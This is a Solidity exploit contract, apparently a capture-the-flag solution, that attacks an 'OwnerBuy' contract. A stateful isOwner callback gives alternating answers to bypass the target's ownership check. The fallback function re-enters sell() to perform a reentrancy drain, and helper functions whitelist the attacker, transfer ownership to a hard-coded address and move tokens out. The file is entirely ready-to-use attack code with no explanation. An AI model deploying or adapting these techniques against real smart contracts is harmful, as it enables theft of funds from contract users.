// 0.5.1-c8a2
// Enable optimization
pragma solidity ^0.5.0;
import "./OwnerBuy.sol";
contract ownerBuyAttack{
    OwnerBuy ownerbuy;
    bool public count;
    bool public isowner;
    constructor()public payable{
    }
    function isOwner(address owner) external returns (bool){
        if(!isowner){
            isowner=true;
            return false;
        }
        isowner=false;
        return true;
    }
    function init (address _addr)public payable{
        ownerbuy = OwnerBuy(_addr);
    }
    function becomeOwner()public{
        ownerbuy.changestatus(address(this));
        ownerbuy.changeOwner();
    }
    function setWhite()public{
        ownerbuy.setWhite(address(this));
        ownerbuy.setWhite(address(ownerbuy));
    }
    function transferOwner()public{
        ownerbuy.transferOwnership(0x220866B1A2219f40e72f5c628B65D54268cA3A9D);
    }
    function buy()public{
        ownerbuy.buy.value(1)();
    }
    function sell()public{
        ownerbuy.sell(200);
    }
    function finish()public{
        ownerbuy.finish();
    }
    function()external payable{
        if(!count){
            count=true;
            ownerbuy.sell(200);
        }
    }
}
contract helper{
    OwnerBuy ownerbuy;
    
    constructor(address _addr)public{
        ownerbuy = OwnerBuy(_addr);
    }
    function buy()public payable{
        ownerbuy.buy.value(1)();
    }
    function transfer(address attacker)public{
        ownerbuy.transfer(attacker,100);
    }
}